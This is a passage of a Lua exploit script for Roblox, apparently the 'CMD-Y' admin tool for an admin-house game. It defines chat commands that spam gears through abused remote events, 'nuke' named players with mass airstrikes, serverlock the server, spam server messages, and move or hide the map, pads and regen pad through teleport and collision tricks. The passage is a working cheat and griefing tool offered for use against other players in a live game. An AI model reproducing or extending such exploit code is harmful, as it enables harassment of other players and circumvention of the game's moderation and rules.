									t:WaitForChild("Click"):FireServer(workspace[v.Name].Torso.Position)

								end
							end


							wait(2)
							act("ungod " .. st)
							act("unspin " .. st)
							act("unff " .. st)
							act("removetools me")
						else
							act("ff " .. v.Name)
							act("god " .. v.Name)
							act("spin " .. v.Name)
							for i = 1,300 do
								act("gear me 0000000000000000000000000000000079446473")
							end
							wait(2)
							if Player:FindFirstChild("Backpack") then
								for _,t in pairs(Player.Backpack:GetChildren()) do

									t.Parent = PlayerService.LocalPlayer.Character
									task.wait(.02)
									t:WaitForChild("Click"):FireServer(workspace[v.Name].Torso.Position)

								end
							end


							wait(2)
							act("ungod " .. v.Name)
							act("unspin " .. v.Name)
							act("unff " .. v.Name)
							act("removetools me")
						end
					end
				end
			end
		end)

		addcmd("regen", "reg", "regenerates pads",function()
			if regen() == true then
				prompt("Regenerated pads")
			end
		end)

		addcmd("findregen", "freg", "finds the regen pad",function()
			local regenfound = false
			local findingregen = false
			local doingskydive = false
			local doingcmdy = false
			if Admin:FindFirstChild("Regen") then
				PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin:FindFirstChild("Regen").CFrame * CFrame.new(0,1,0)
			else
				findingregen = true
				task.spawn(function()
					while findingregen do
						task.wait()
						pcall(function()
							game.Players.LocalPlayer.Character.Parent = workspace
						end)
					end
				end)
				doingskydive = true
				prompt("Trying skydive locations..")
				pcall(function()
					clientloadpos(CFrame.new(ogcframes["Regen"][1],ogcframes["Regen"][2],ogcframes["Regen"][3],ogcframes["Regen"][4],ogcframes["Regen"][5],ogcframes["Regen"][6],ogcframes["Regen"][7],ogcframes["Regen"][8],ogcframes["Regen"][9],ogcframes["Regen"][10],ogcframes["Regen"][11],ogcframes["Regen"][12]) * CFrame.new(0,20,0))
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					task.spawn(function()
						while doingskydive do
							task.wait()
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,100,0)
							if Admin:FindFirstChild("Regen") then
								regenfound = true
								doingskydive = false
								break
							end
						end
					end)
					task.wait(10)
					if not regenfound then
						doingskydive = false
						prompt("Regen not skydived.")
						prompt("Trying CMD-Y locations..")
						doingcmdy = true
						task.spawn(function()
							while doingcmdy do
								fwait()
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-30593, -23388), math.random(-30593, -10455), math.random(-30593, -10455))
								if Admin:FindFirstChild("Regen") then
									PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
									regenfound = true
									doingcmdy = false
									break
								end
							end
						end)
						task.wait(15)
						if not foundregen then
							doingcmdy = false
							prompt("Regen not moved by CMD-Y.")
							prompt("Trying leaked locations..")
							clientloadpos(CFrame.new(Vector3.new(1000000, 1000000, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, 1000003, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, -1000003, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, -1000000, -3)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(3, -1000000, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, -3, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-1000000, -3, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, 3, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, 1000003, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, -1000003, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(454545, 150000, -678678)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(306712, 420552, 398158)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-1000000, 1000003, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-1000000, 1000003, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-1000000, -1000003, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(45400, -49860, 56673)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(56470, -48312, 28578)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(75304, -49638, 47300)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(34120, -48830, 30233)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(34120, -48830, 30233)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(77822, -49751, 79116)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(42682, -29202, 29886)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(51052, -49558, 34068)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-251773, 1000003, 382563)))
							task.wait(.5)
							clientloadpos(CFrame.new(0, 2.5, 0))
							task.wait(.5)
							if not Admin:FindFirstChild("Regen") then
								prompt("Couldn't find the regen pad. Sorry!")
								forcerespawn()
							else
								prompt("Found regen!")
								PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin.Regen.CFrame * CFrame.new(0,1,0)
								wait(1)
								forcerespawn()

								workspace.Gravity = 198.2
								findingregen = false
							end
						else
							prompt("Found regen!")
							PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin.Regen.CFrame * CFrame.new(0,1,0)
							wait(1)
							forcerespawn()

							workspace.Gravity = 198.2
							findingregen = false
						end
					else
						prompt("Found regen!")
						PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin.Regen.CFrame * CFrame.new(0,1,0)
						wait(1)
						forcerespawn()

						workspace.Gravity = 198.2
						findingregen = false
					end
				end)
			end
		end)
		addcmd("findpads", "fpads", "finds the admin pads", function()
			local loop1 = false
			local loop2 = false
			local dnd = false
			local amt = 0
			for _,v in pairs(Pads) do
				if v:FindFirstChildOfClass("Part") then
					amt = amt + 1
				end
			end
			if amt == 9 then
				prompt("All pads are loaded!")
				loop1 = false
				loop2 = false
				return
			else
				amt = 0
				local loop2 = true
				prompt("Trying skydive locations..")
				clientloadpos(CFrame.new(ogcframes["Pad1"][1],ogcframes["Pad1"][2],ogcframes["Pad1"][3],ogcframes["Pad1"][4],ogcframes["Pad1"][5],ogcframes["Pad1"][6],ogcframes["Pad1"][7],ogcframes["Pad1"][8],ogcframes["Pad1"][9],ogcframes["Pad1"][10],ogcframes["Pad1"][11],ogcframes["Pad1"][12]) * CFrame.new(0,40,0))
				wait(2)
				task.spawn(function()
					while loop2 == true do
						task.wait(.3)
						PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity + Vector3.new(0, 1000, 0)
						for _,v in pairs(Pads) do
							if v:FindFirstChildOfClass("Part") then
								amt = amt + 1
							end
						end
						if amt == 9 then
							prompt("Found all pads")
							loop2 = false
							loop1 = false
							PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
							dnd = true
							forcerespawn()
							break
						end
						amt = 0
						if loop2 == false then break end
					end
				end)
				if dnd == true then return end
				wait(10)
				loop2 = false
				amt = 0
				for _,v in pairs(Pads) do
					if v:FindFirstChildOfClass("Part") then
						amt = amt + 1
					end
				end
				if amt == 9 then
					prompt("Found all pads")
					loop2 = false
					loop1 = false
					dnd = true
					forcerespawn()
					return
				else
					prompt("Couldn't find all pads.")
				end
				if dnd == true then return end

				workspace.Gravity = 0
				loop1 = true
				task.spawn(function()
					prompt("Trying CMD-Y locations..")
					while loop1 do
						task.wait()
						clientloadpos(CFrame.new(math.random(-30593, -23388), math.random(-30593, -10455), math.random(-30593, -10455)))
						amt = 0
						for _,v in pairs(Pads) do
							if v:FindFirstChildOfClass("Part") then
								amt = amt + 1
							end
						end
						if amt == 9 then
							prompt("Found all pads")
							loop2 = false
							loop1 = false
							dnd = true
							forcerespawn()
							return
						end
					end
				end)
				if dnd == true then return end
				wait(10)
				amt = 0
				loop1 = false
				for _,v in pairs(Pads) do
					if v:FindFirstChildOfClass("Part") then
						amt = amt + 1
					end
				end
				if amt == 9 then
					prompt("Found all pads")
					loop2 = false
					loop1 = false
					dnd = true
					forcerespawn()
					return
				else
					prompt("Couldn't find all pads.")
					forcerespawn()
				end
				if dnd == true then return end
				fixgame()
			end
		end)

		addcmd("fixfloors", "fixfl", "fixes the floors",function()
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			if Map["Basic House"]:FindFirstChild("SmoothBlockModel38") then
				moveobject(Map["Basic House"]:FindFirstChild("SmoothBlockModel38"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map["Basic House"]:FindFirstChild("SmoothBlockModel40") then
				moveobject(Map["Basic House"]:FindFirstChild("SmoothBlockModel40"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map["Basic House"]:FindFirstChild("SmoothBlockModel112") then
				moveobject(Map["Basic House"]:FindFirstChild("SmoothBlockModel112"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)

		addcmd("rejoin", "rj", "rejoins",function()
			RJ()
		end)

		addcmd("serverhop", "shop", "serverhops", function()
			SHop()
		end)

		addcmd("paintrandom", "prmap", "makes the map random colors",function()
			colorAPI.colorallRandom()
		end)

		addcmd("whitelist", "wl", "whitelists a user",function(plr)
			wl(plr)
		end)

		addcmd("unwhitelist", "unwl", "unwhitelists a user",function(plr)
			unwl(plr)
		end)

		addcmd("blacklist", "bl", "blacklists a user",function(plr)
			bl(plr)
		end)

		addcmd("unblacklist", "unbl", "unblacklists a user",function(plr)
			unbl(plr)
		end)

		addcmd("padban", "pb", "padbans a user",function(plr)
			pb(plr)
		end)

		addcmd("unpadban", "unpb", "unpadbans a user",function(plr)
			unpb(plr)
		end)

		addcmd("permbl", "pbl", "unpadbans a user",function(plr)
			pbl(plr)
		end)

		addcmd("unpermbl", "unpbl", "unpadbans a user",function(plr)
			unpbl(plr)
		end)

		addcmd("goto", "to", "gos to a player", function(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname then
					if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
						if workspace:FindFirstChild(v.Name) and workspace:FindFirstChild(v.Name):FindFirstChild("HumanoidRootPart") then
							workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart").CFrame = workspace:FindFirstChild(v.Name):FindFirstChild("HumanoidRootPart").CFrame
						end
					end
				end
			end
		end)

		addcmd("bring", "br", "bring a player",function(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local isBypass,st = bypassattemptcheck(v.Name)
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname then
					if isBypass then
						act("tp " .. st .. " me")
					else
						act("tp " .. v.Name .. " me")
					end
				elseif plr == "all" then
					act("tp all me")
				end
			end
		end)

		addcmd("fixpaint", "fixp", "fixes paint",function()
			if PlayerService.LocalPlayer.Backpack:FindFirstChild("PaintBucket") then
				PlayerService.LocalPlayer.Backpack:FindFirstChild("PaintBucket"):Destroy()
				act("removetools me")
			end
			if PlayerService.LocalPlayer.Character:FindFirstChild("PaintBucket") then
				PlayerService.LocalPlayer.Character:FindFirstChild("PaintBucket"):Destroy()
				act("removetools me")
			end
			act("gear me 000000000000000000000000000018474459")
			PlayerService.LocalPlayer.Backpack:WaitForChild("PaintBucket").Parent = PlayerService.LocalPlayer.Character
			local bucket = PlayerService.LocalPlayer.Character:WaitForChild("PaintBucket")
			colorallOriginal()

		end)

		addcmd("fixbaseplate", "fixbp", "fixes the baseplate",function()
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			moveobject(Map.Baseplate, 2)
			repeat fwait() until movestatus == false
			workspace.Gravity = 198.2
			act("respawn me")
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		addcmd("fixmap", nil, "fixes the map (obby,floors,baseplate,spawns, etc)",function()
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			moveobject(Map.Baseplate, 2)
			repeat fwait() until movestatus == false
			act("respawn me")
			for _,v in pairs(Map["Obby Box"]:GetChildren()) do
				moveobject(v, 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(Map["Obby"]:GetChildren()) do
				moveobject(v, 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map["Basic House"]:FindFirstChild("SmoothBlockModel38") then
				moveobject(Map["Basic House"]:FindFirstChild("SmoothBlockModel38"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map["Basic House"]:FindFirstChild("SmoothBlockModel40") then
				moveobject(Map["Basic House"]:FindFirstChild("SmoothBlockModel40"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map["Basic House"]:FindFirstChild("SmoothBlockModel112") then
				moveobject(Map["Basic House"]:FindFirstChild("SmoothBlockModel112"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map:FindFirstChild("Spawn1") then
				moveobject(Map:FindFirstChild("Spawn1"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map:FindFirstChild("Spawn2") then
				moveobject(Map:FindFirstChild("Spawn2"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			if Map:FindFirstChild("Spawn3") then
				moveobject(Map:FindFirstChild("Spawn3"), 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(Map["Admin Dividers"]:GetChildren()) do
				moveobject(v, 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			fixgame()
		end)

		addcmd("btools", "ssbtools", "gives you SS btools",function()
			loadbtools()
		end)

		addcmd("servermsg", "sm", "displays a server message without ur username", function(msg)
			servermsg(msg)
		end)

		addcmd("up", "u", "sends you upwards", function()
			if Admin.Pads:FindFirstChild(Player.Name .. "'s admin") then
				act("skydive me")
			else
				if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
					PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1000,0)
				end
			end
		end)

		addcmd("spam", "s", "spams the msg after",function(msg)
			if spamming == true then
				spamming = false
				spam(msg)
			else
				spam(msg)
			end
		end)

		addcmd("stop", "uns", "stops spam",function()
			spamming = false
			rnamel = false
		end)


		addcmd("guns", nil, "gives you guns", function()
			for i,_ in pairs(guncodes) do
				act("gear me 0000000000000000000000000000000000000000" .. guncodes[i])
			end
		end)

		addcmd("swords", nil, "gives you swords", function()
			for i,_ in pairs(swordcodes) do
				act("gear me 0000000000000000000000000000000000000000" .. swordcodes[i])
			end
		end)

		addcmd("fungears", "fgears", "gives you fun gears", function()
			for i,_ in pairs(fungears) do
				act("gear me 0000000000000000000000000000000000000000" .. fungears[i])
			end
		end)

		addcmd("clientbtools", "cbtools", "gives you client btools", function(plr)
			if plr ~= nil and plr ~= "" or plr ~= " " then
				for _,v in pairs(PlayerService:GetPlayers()) do
					local name,plrname = string.lower(v.Name), string.lower(plr)
					local isBypass,st = bypassattemptcheck(v.Name)
					if string.sub(name, 1, string.len(plrname)) == plrname then
						if isBypass == true then
							if showsm then
								act("pm " .. st .. " These btools are client sided, it only works on your screen.")
							end
							act("gear " .. st .. " 16200204")
							act("gear " .. st .. " 16200402")
							act("gear " .. st .. " 16969792")
							act("gear " .. st .. " 73089190")
						else
							if showsm then
								act("pm " .. v.Name .. " These btools are client sided, it only works on your screen.")
							end
							act("gear " .. v.Name .. " 16200204")
							act("gear " .. v.Name .. " 16200402")
							act("gear " .. v.Name .. " 16969792")
							act("gear " .. v.Name .. " 73089190")
						end
					end
				end
			end
		end)

		addcmd("destgears", "dgears", "gives you destructive gears", function()
			for i,_ in pairs(destructivecodes) do
				act("gear me 0000000000000000000000000000000000000000" .. destructivecodes[i])
			end
		end)

		addcmd("explosives", "expl", "gives you explosives", function()
			for i,_ in pairs(explosivecodes) do
				act("gear me 0000000000000000000000000000000000000000" .. explosivecodes[i])
			end
		end)

		addcmd("melees", nil, "gives you melees", function()
			for i,_ in pairs(meleecodes) do
				act("gear me 0000000000000000000000000000000000000000" .. meleecodes[i])
			end
		end)

		addcmd("rideables", "ride", "gives you rideable gearse", function()
			for i,_ in pairs(rideablecodes) do
				act("gear me 0000000000000000000000000000000000000000" .. rideablecodes[i])
			end
		end)

		addcmd("serverlock", "slock", "serverlocks", function()
			Serverlock = true
			Toggle(ServerlockT, 1)
			slock()
		end)

		addcmd("unserverlock", "unslock", "turns server lock off", function()
			Serverlock = false
			Toggle(ServerlockT, 2)
			act("respawn others")
			if showsm then
				servermsg("[ CMD-Y ] This server is now unlocked")
			else
				prompt("This server is now unlocked")
			end
		end)

		addcmd("protectserver", "pserv", "protects the server (crashes, admin abuse, double pads, etc)", function()
			if showsm then
				servermsg("[ CMD-Y ] Server Protection is now on.")
			else
				prompt("Server Protection is now on.")
			end
			Protection = true
			Toggle(ProtectServerT, 1)
		end)

		addcmd("unprotectserver", "unpserv", "stops protecting the server", function()
			if showsm then
				servermsg("[ CMD-Y ] Server Protection is now off.")
			else
				prompt("Server Protection is now off.")
			end
			Protection = false
			Toggle(ProtectServerT, 2)
		end)

		addcmd("permall", "perm", "allows everyone in the server to use commands, limited", function()
			PlrsAdmin = true
			Toggle(PermAdminAllT, 1)
			if showsm then
				servermsg("[ CMD-Y ] Perm admin is now on in this server. Chat any command.")
			else
				prompt("Perm admin is now on in this server. Chat any command.")
			end
		end)

		addcmd("unpermall", "unperm", "stops perm", function()
			PlrsAdmin = false
			Toggle(PermAdminAllT, 2)
			if showsm then
				servermsg("[ CMD-Y ] Perm admin is now off in this server.")
			else
				prompt("Perm admin is now off in this server.")
			end
		end)

		addcmd("antiabuse", "antiab", "protects yourself from being abused (dog, freeze, jail, punish, etc", function()
			AntiAbuse = true
			Toggle(AntiAbuseT, 1)
			prompt("AntiAbuse is now enabled...")
		end)

		addcmd("unantiabuse", "unantiab", "protects yourself from being abused (dog, freeze, jail, punish, etc", function()
			AntiAbuse = false
			Toggle(AntiAbuseT, 2)
			prompt("AntiAbuse is now disabled..")
		end)

		addcmd("antideath", "nok", "protects you from death", function()
			AntiDeath = true
			Toggle(AntiDeathT, 1)
			if Map:FindFirstChild("Obby") then
				for _,v in pairs(Map["Obby"]:GetDescendants()) do
					if v.Name == "TouchInterest" then
						v:Destroy()
					end
				end
			end
			prompt("AntiDeath is now enabled.")
		end)

		addcmd("unantideath", "unnok", "protects you from death", function()
			AntiDeath = false
			Toggle(AntiDeathT, 2)
			prompt("AntiDeath is now disabled.")
		end)

		addcmd("loopgrab", "lg", "loopgrabs pads", function()
			LoopGrab = true
			Toggle(LoopgrabT, 1)
			prompt("Loopgrab is on.")
		end)

		addcmd("unloopgrab", "unlg", "stops loobgrabbing pads", function()
			LoopGrab = false
			Toggle(LoopgrabT, 2)
			prompt("Loopgrab is off.")
		end)

		addcmd("hideregen", "delreg", "deletes/hides the regen", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			moveobject(Admin.Regen, 1)
			repeat task.wait() until movestatus == false
			workspace.Gravity = 198.2
			act("respawn me")
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		addcmd("fixregen", "fixreg", "deletes/hides the regen", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			moveobject(Admin.Regen, 2)
			repeat task.wait() until movestatus == false
			workspace.Gravity = 198.2
			act("respawn me")
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		addcmd("delobby", "robby", "deletes/removes the obby", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			if Map:FindFirstChild("Obby") then
				for _,v in pairs(Map["Obby"]:GetDescendants()) do
					if v.Name == "TouchInterest" then
						v:Destroy()
					end
				end
			end
			for _,v in pairs(Map["Obby Box"]:GetChildren()) do
				moveobject(v, 1)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(Map.Obby:GetChildren()) do
				moveobject(v, 1)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)

		addcmd("hidepads", "delpads", "hides/deletes the admin pads", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			for _,v in pairs(Pads) do
				if v:FindFirstChildOfClass("Part") then
					v:FindFirstChildOfClass("Part").CanCollide = true
					moveobject(v:FindFirstChildOfClass("Part"), 1)
					repeat fwait() until movestatus == false
					act("respawn me")
					v:FindFirstChildOfClass("Part").CanCollide = false
				end
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)

		addcmd("delbase", "rbase", "deletes/removes the baseplate", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			moveobject(Map.Baseplate, 1)
			repeat fwait() until movestatus == false
			workspace.Gravity = 198.2
			act("respawn me")
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		addcmd("fixhouse", "fixh", "fixes the house (Time consuming!)", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end

			for _,v in pairs(Map["Basic House"]:GetChildren()) do
				if allclear() == false then break end
				moveobject(v, 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end

			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		addcmd("delhouse", "delh", "deletes the house (Time consuming!)", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end

			for _,v in pairs(Map["Basic House"]:GetChildren()) do
				if allclear() == false then break end
				moveobject(v, 1)
				repeat fwait() until movestatus == false
				act("respawn me")
			end

			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		addcmd("delbuild", "delbb", "deletes the building bricks", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end

			for _,v in pairs(Map["Building Bricks"]:GetChildren()) do
				if allclear() == false then break end
				moveobject(v, 1)
				repeat fwait() until movestatus == false
				act("respawn me")
			end

			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		addcmd("fixobby", "fobby", "fixes the obby", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			if Map:FindFirstChild("Obby") then
				for _,v in pairs(Map["Obby"]:GetDescendants()) do
					if allclear() == false then break end
					if v.Name == "TouchInterest" then
						v:Destroy()
					end
				end
			end
			for _,v in pairs(Map["Obby Box"]:GetChildren()) do
				if allclear() == false then break end
				moveobject(v, 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(Map.Obby:GetChildren()) do
				if allclear() == false then break end
				moveobject(v, 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)

		addcmd("fixbb", "fbb", "fixes the building bricks", function()
			prompt("Please wait..")
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			for _,v in pairs(Map["Building Bricks"]:GetChildren()) do
				if allclear() == false then break end
				moveobject(v, 2)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)

		addcmd("fixpads", "bpads", "fixes the admin pads", function()
			prompt("Please wait..")
			if movestatus == true then return end
			prompt("WTF")
			for i,v in pairs(Pads) do
				if allclear() == false then break end
				if v:FindFirstChildOfClass("Part") then
					v:FindFirstChildOfClass("Part").Name = "Pad" .. tostring(i)
				end
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			for i,v in pairs(Pads) do
				if allclear() == false then break end
				if v:FindFirstChildOfClass("Part") then
					v:FindFirstChildOfClass("Part").CanCollide = true
					moveobject(v:FindFirstChildOfClass("Part"), 2)
					repeat fwait() until movestatus == false
					act("respawn me")
					v:FindFirstChildOfClass("Part").CanCollide = false
				end
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if allclear() == false then break end
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)

		addcmd("nuke", nil, "nukes someone", function(plr)
			local fullCircle = 2 * math.pi
			local radius = 10
			local function getXAndZPositions(angle)
				local x = math.cos(angle) * radius
				local z = math.sin(angle) * radius
				return x, z
			end
			for _,v in pairs(PlayerService:GetPlayers()) do
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname then
					if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
						if workspace:FindFirstChild(v.Name) and workspace:FindFirstChild(v.Name):FindFirstChild("HumanoidRootPart") then
							for i = 1,100 do
								act("gear me 0000000000000000000088885539")
							end

							wait(1)
							for i,c in pairs(Player.Backpack:GetChildren()) do
								if c.Name == "Tactical Airstrike" then
									local angle = i * (fullCircle / 50)
									local x, z = getXAndZPositions(angle)
									c.Parent = Player.Character
									c:WaitForChild("OnMouseClick"):FireServer((workspace[v.Name].HumanoidRootPart.CFrame * CFrame.new(x, 0, z)).p)
								end
							end
							wait(10)
							act("removetools me")

						end
					end
				end
			end
		end)

		addcmd("pmsg", "permmsg", "sets a perm message at the top until 'unset' is run", function(msg)
			pmsg = true
			task.spawn(function()
				while true do
					task.wait(.3)
					servermsg(msg)
					if pmsg == false then break end
				end
			end)
		end)

		addcmd("unset", "unpmsg", "unsets the perm message", function()
			pmsg = false
		end)

		addcmd("surround", nil, "surrounds someone with planes", function(plr)
			local fullCircle = 2 * math.pi
			local radius = 10 
			local function getXAndZPositions(angle)
				local x = math.cos(angle) * radius
				local z = math.sin(angle) * radius
				return x, z
			end
			for _,v in pairs(PlayerService:GetPlayers()) do
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname then
					if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
						if workspace:FindFirstChild(v.Name) and workspace:FindFirstChild(v.Name):FindFirstChild("HumanoidRootPart") then
							for i = 1,100 do
								act("gear me 0000000000000000000088885539")
							end

							wait(1)
							for i,c in pairs(Player.Backpack:GetChildren()) do
								if c.Name == "Tactical Airstrike" then
									local angle = i * (fullCircle / 50)
									local x, z = getXAndZPositions(angle)
									c.Parent = Player.Character
									c:WaitForChild("OnMouseClick"):FireServer((workspace[v.Name].HumanoidRootPart.CFrame * CFrame.new(x, 0, z)).p)
								end
							end
							wait(1)
							act("removetools me")
						end
					end
				end
			end
		end)

		addcmd("fixcam", "fixc", "fixes your camera", function()
			task.spawn(function()
				local lp = PlayerService.LocalPlayer
				local ui = game:GetService("UserInputService")
				local l__ContextActionService__7 = game:GetService("ContextActionService");
				local l__RunService__1 = game:GetService('RunService')
				l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
				l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
				l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
				while true do
					fwait()
